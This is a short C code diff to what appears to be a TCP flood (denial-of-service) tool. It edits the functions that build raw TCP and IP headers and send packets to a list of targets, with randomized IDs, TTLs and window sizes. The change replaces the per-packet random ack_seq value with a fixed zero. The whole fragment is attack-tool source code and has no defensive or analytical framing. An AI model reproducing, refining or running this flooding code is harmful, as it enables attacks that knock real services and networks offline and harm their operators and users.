@@ -185,7 +185,6 @@ void setup_tcp_header(struct tcphdr *tcph)
 	tcph->dest = htons(ports[rand_cmwc() % 2]);
 	tcph->source = htons(floodport);
 	tcph->ack = 0;
-	tcph->ack_seq = randnum(10000, 99999);
 	tcph->psh = 0;
 	tcph->fin = 0;
 	tcph->rst = 0;
@@ -196,6 +195,7 @@ void setup_tcp_header(struct tcphdr *tcph)
 	tcph->urg_ptr = 0;
 	tcph->window = 8192;
 	tcph->check = 0;
+	tcph->ack_seq = 0;
 }
 
 void setup_tcpopts_header(struct tcpOptions *opts)
@@ -295,7 +295,6 @@ void *flood(void *par1)
 		iph->daddr = list_node->data.sin_addr.s_addr;
 		iph->id = htonl(rand_cmwc() & 0xFFFF);
 		iph->check = csum((unsigned short *)datagram, iph->tot_len);
-		tcph->ack_seq = randnum(10000, 99999);
 		iph->ttl = randnum(64, 255);
 		tcph->window = htons(windows[rand_cmwc() % 4]);
 
